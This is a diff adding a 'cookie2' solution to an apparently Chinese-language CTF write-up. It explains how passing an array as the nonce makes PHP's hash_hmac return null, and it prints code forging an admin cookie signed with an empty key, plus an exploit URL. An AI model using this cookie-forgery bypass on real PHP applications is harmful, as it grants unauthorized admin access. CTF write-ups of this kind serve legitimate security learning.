@@ -79,3 +79,15 @@
   echo urlencode(serialize($obj));
   ```
   輸入之後觀看原始碼含有flag
+
+# cookie2
+  程式碼使用`===`，因此無法透過碰撞的方式偽造hash值，傳入陣列使得產生金鑰的函數返回為空
+
+  ``` php
+  $flag = 'flag1';
+  $nonce = array('null');
+  echo urlencode('admin|' . hash_hmac('sha256', 'admin', ''));
+  # 與下面等價
+  # echo urlencode('admin|' . hash_hmac('sha256', 'admin', hash_hmac('sha256',$nonce, $flag)));
+  ``` 
+  修改玩cookie之後[享受](http://ctf.bitx.tw:10002/?nonce[]=thisisanonce)
